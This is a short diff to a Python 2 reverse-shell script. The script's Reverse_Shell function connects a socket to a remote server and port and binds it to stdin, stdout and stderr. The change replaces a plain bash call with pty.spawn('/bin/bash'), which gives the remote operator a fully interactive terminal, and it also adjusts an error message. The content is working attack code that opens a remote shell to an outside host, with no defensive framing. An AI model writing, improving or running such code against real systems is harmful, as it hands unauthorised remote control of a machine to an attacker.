@@ -13,6 +13,7 @@ import socket
 import sys
 import os
 import subprocess
+import pty
 #from termcolor import*
 
 # Description
@@ -35,10 +36,10 @@ def Reverse_Shell(r_Server, r_Port):
 		os.dup2(s.fileno(),0)
 		os.dup2(s.fileno(),1) 
 		os.dup2(s.fileno(),2)   # Set here different Shell Envirioment
-		shell = subprocess.call(["/bin/bash", "-i"])
+		shell = pty.spawn("/bin/bash")
 	except Exception, e: # if Connection is Refused by Server
 		#print (colored('[!] CONNECTION REFUSED! ','red')) + r_Server
-		print "[!] CONNECTION REFUSED" + r_Server
+		print "[!] CONNECTION REFUSED: " + r_Server
 		sys.exit(1)
 Reverse_Shell(r_Server, r_Port)
 
